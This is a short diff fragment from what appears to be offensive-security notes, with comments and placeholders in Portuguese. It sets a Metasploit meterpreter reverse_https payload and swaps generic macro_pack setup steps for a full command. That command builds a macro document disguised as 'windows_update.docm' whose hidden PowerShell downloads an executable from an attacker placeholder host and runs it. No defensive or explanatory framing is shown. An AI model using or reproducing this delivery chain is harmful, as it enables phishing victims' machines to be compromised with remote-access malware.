@@ -24,6 +24,4 @@ wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup
 
 set PAYLOAD windows/x64/meterpreter/reverse_https
 
-git clone https://github.com/sevagas/macro_pack
-cd macro_pack
-python3 macro_pack.py -t D -G -o windows_update.docm -p "powershell comando_para_baixar_payload"
+python3 macro_pack.py -t D -G -o windows_update.docm -p "powershell -w hidden -c Invoke-WebRequest -Uri http://<SEU_IP>:8080/payload.exe -OutFile C:\\Users\\Public\\update.exe; Start-Process C:\\Users\\Public\\update.exe"
